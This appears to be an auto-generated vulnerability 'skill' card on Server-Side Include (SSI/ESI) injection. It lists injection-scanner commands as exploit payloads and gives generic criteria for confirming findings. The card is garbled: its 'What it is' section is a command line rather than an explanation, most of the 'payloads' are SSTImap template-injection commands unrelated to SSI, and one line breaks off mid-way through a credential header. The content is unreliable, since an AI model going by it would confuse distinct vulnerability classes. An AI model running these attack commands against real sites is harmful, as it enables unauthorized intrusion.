# Server-Side Includes (SSI/ESI) — @includr2 skill
> cats: (advisory — no static taint rule yet) · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s

## Exploit payloads (from PayloadsAllTheThings)
- `python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s`
- `python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SS`
- `python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3`
- `Surrogate-Control: content="ESI/1.0"`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Server-Side%20Includes%20%28SSI/ESI%29
- HackTricks Cloud: https://cloud.hacktricks.wiki/
